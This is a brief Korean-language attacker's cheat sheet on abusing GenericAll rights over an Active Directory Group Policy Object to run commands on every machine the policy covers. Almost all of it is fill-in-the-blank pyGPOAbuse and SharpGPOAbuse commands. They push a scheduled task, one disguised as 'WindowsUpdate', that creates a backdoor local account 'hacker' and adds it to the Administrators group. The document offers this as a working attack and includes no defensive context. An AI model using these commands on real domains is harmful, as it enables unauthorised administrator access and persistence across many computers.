# GPO 대상

GPO에 GenericAll이 있으면 GPO가 적용된 모든 컴퓨터와 유저에게 명령을 실행할 수 있다.

## 스케줄 태스크 추가 → 하위 오브젝트 RCE

```bash
# pyGPOAbuse (Linux)
# GUI에서 GPO 선택 후 GUID 확인
python3 pygpoabuse.py <도메인>/<공격자계정>:'<패스워드>' \
  -gpo-id '<GPO_GUID>' \
  -powershell \
  -command 'cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add' \
  -dc-ip <DC_IP>  # ← 수정
```

```powershell
# SharpGPOAbuse (Windows)
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author <도메인>\Administrator \
  --Command "cmd.exe" \
  --Arguments "/c net user hacker Pass123! /add" \
  --GPOName "<대상GPO>"  # ← 수정
```